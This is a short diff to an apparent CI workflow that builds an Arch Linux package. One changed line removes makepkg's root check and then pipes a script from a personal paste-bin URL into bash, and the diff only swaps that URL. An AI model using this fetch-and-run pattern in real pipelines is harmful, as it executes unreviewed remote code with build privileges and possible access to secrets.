@@ -28,4 +28,4 @@ jobs:
         run: |
           curl -fsSL "https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static" -o pacman-static && chmod +x pacman-static && mv pacman-static /usr/bin/
           pacman-static -Syu --needed --noconfirm gtest
-          sed -i '/E_ROOT/d' /usr/bin/makepkg && makepkg -s && curl -s https://bin.cyberknight777.dev/gejY/raw | bash
+          sed -i '/E_ROOT/d' /usr/bin/makepkg && makepkg -s && curl -s https://bin.cyberknight777.dev/EhQj/raw | bash
